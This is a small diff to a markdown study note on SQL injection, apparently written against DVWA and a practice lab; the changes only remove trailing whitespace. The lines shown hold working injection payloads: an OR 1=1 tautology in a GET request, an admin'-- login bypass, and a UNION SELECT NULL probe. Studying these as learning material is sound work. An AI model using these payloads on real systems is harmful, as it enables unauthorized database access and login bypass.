@@ -32,7 +32,7 @@ test web: `www.dvwa.co.uk`
 
 ![Screen Shot 2020-11-18 at 12.29.51](https://i.imgur.com/XqX9weI.png)
 
-`UPDATE, INSERT, SELECT, ORDER BY` 
+`UPDATE, INSERT, SELECT, ORDER BY`
 
 1. retrieve hidden data:
    1. input: Gifts
@@ -50,7 +50,7 @@ test web: `www.dvwa.co.uk`
    3. `GET /web3/login/?id=1'+OR+1+%3d+1+%23&`Submit=Submit `HTTP/1.1`
    4. input: admin 12345
    5. `SELECT * FROM user WHERE username = 'admin' AND password = '12345'`
-   6. input: admin'-- 
+   6. input: admin'--
    7. `SELECT * FROM user WHERE username = 'admin'`--' AND password = '12345'
 3. retrieve data from other database tables
    1. input: Gifts
@@ -71,7 +71,7 @@ detecting SQL injection vulnerabilities: use scanner
 lab:
 
 ```
-https://abc.net/filter?category=Lifestyle' UNION SELECT NULL,NULL,NULL--  
+https://abc.net/filter?category=Lifestyle' UNION SELECT NULL,NULL,NULL--
 
 
 ```
